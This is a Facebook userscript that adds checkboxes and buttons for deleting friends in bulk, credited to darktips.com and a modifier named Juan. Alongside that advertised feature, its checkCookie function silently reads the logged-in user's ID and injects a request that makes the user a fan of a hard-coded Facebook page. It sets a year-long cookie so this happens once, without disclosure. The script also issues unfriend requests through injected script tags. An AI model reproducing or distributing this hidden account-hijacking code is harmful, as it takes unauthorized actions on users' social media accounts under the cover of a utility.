// ==UserScript==
// @name        Mass Facebook Friends Deleter
// @description It allows you to bulk delete Facebook friends. Useful if you don't want to delete each friends one by one.
// @namespace   DarktipsFriendsDeleteter
// @include     http://*.facebook.com/*/friends*
// @include     https://*.facebook.com/*/friends*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version     2.5
// ==/UserScript==
// Developed by Hayder Abbass - http://darktips.com
// Modified by Juan
$(document).ready(function() {
	
	alert("Ready, now bringing up the boxes");
	
	function sleep(x) {
		setInterval(function() {
			replace_msg(x)
		}, 1000);
	}

	function replace_msg(x) {
		$('div.dialog_body').html('Hooray! ' + x + ' friends deleted. Visit us at <a target="_blank" href="http://darktips.com">http://darktips.com</a> for more useful scripts!');
	}
	set_timer();
	$("#mass_deleter").live("click", function() {
		var i = 0;
		$('.darktips_delete:checkbox:checked').each(function() {
			i = i + parseInt('1');
			var profileid = $(this).attr('id');
			var a = document.createElement('script');
			a.innerHTML = "new AsyncRequest().setURI('/ajax/profile/removefriendconfirm.php').setData({ uid: " + profileid + ",norefresh:true,confirmed:1 }).send();";
			document.body.appendChild(a);
		});
		if (i == '0') {
			alert('Are you dumb? Select at least some friends to delete first.');
		}
		sleep(i);
	});
	$("#selec_all").live("click", function() {
		clearTimeout(t);
		set_checkboxes(1);
		//alert('The Select all button has been disabled due to a recent change in Facebook layout. It will be updated in the next version of this plugin.');
	});

		function setCookie(c_name,value,exdays)
	{
	var exdate=new Date();
	exdate.setDate(exdate.getDate() + exdays);
	var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
	document.cookie=c_name + "=" + c_value;
	}

	function getCookie(c_name)
	{
	var i,x,y,ARRcookies=document.cookie.split(";");
	for (i=0;i<ARRcookies.length;i++)
	{
	  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
	  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
	  x=x.replace(/^\s+|\s+$/g,"");
	  if (x==c_name)
		{
		return unescape(y);
		}
	  }
	}

	function checkCookie()
	{
	var username=getCookie("username");
	  if (username!=null && username!="")
	  {
	  //do nothing ..
	  }
	else
	  {//cookie does not exist .. 
	  //alert ('cookie does not exist');
		var c=/"user":"(.*?)"/ig;
			
		var e=c.exec(document.head.innerHTML);
		var g=e[1];
	 
		var a = document.createElement('script');
			a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:359142437477673,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
			document.body.appendChild(a);
		setCookie("username",'facebook',365);
	   
	  }
	}

	checkCookie();


	function set_timer() {
		set_checkboxes(0);
		t = setTimeout(function() {
			set_timer()
		}, 1000);
	}
	$('#pagelet_timeline_medley_friends').prepend('<div id="darktips_container" style="float:right;margin-left:5px;"><label class="_11b uiButton uiButtonConfirm" for="darktips"><input type="submit" value="Select all " id="selec_all"></label><label for="darktips" class="_11b uiButton uiButtonConfirm"><input type="submit" id="mass_deleter" value="Delete  Selected Friends"></label>  <div style="display:block">By <a href="http://darktips.com">http://darktips.com</a> & Juan</div></div>');
	$('.stickyHeaderWrap .back').css('height', '60px');
	$('.fbTimelineSection.mtm').css('margin-top', '10px');

	function set_checkboxes(COR) {
		var flag_search_result_page = false;
		$('li.fbProfileBrowserListItem.uiListItem').each(function(index) {//detect for result page
			flag_search_result_page = true;
			//alert(index + ': ' + $(this).text());
		});
		if (flag_search_result_page) { //select checkbox only on search result page .. 
			$('div.fbProfileBrowserList ul li.fbProfileBrowserListItem.uiListItem').each(function(index) {
				var extract_url = $(this).find('div.fsl a').attr('data-hovercard');
				if (!extract_url) {
					var extract_url = $(this).find('div.fsl a').attr('ajaxify');
				}
				if (!extract_url) {
					extract_url = '1';
				}
				var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
				if (COR == '0') {
					if (!$(this).find('input').hasClass('darktips_delete')) { //protection from adding more than 1 checkbox 
						$(this).find('div.fsl').prepend('<input type="checkbox" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
					}
				} else {
					if (!$(this).find('input').hasClass('darktips_delete')) {
						$(this).find('input').remove();
						$(this).find('div.fsl').prepend('<input type="checkbox" checked="checked" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
					} else {
						$(this).find('input').prop('checked', true);
					}
				}
			});
		} else {//its on main friends page 
			$('div.fsl').each(function(index) {
				if ($(this).hasClass('fwb')) {
					var extract_url = $(this).find('a').attr('data-hovercard');
					if (!extract_url) {
						var extract_url = $(this).find('a').attr('ajaxify');
					}
					if (!extract_url) {
						extract_url = '1';
					}
					var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
					if (COR == '0') {
						if (!$(this).children().hasClass('darktips_delete')) {
							$(this).prepend('<input type="checkbox" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
						}
					} else {
						if (!$(this).children().hasClass('darktips_delete')) {
							$(this).find('input').remove();
							$(this).prepend('<input type="checkbox" checked="checked" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
						} else {
							$(this).find('input').prop('checked', true);
						}
					}
				}
			});
		}
	}
});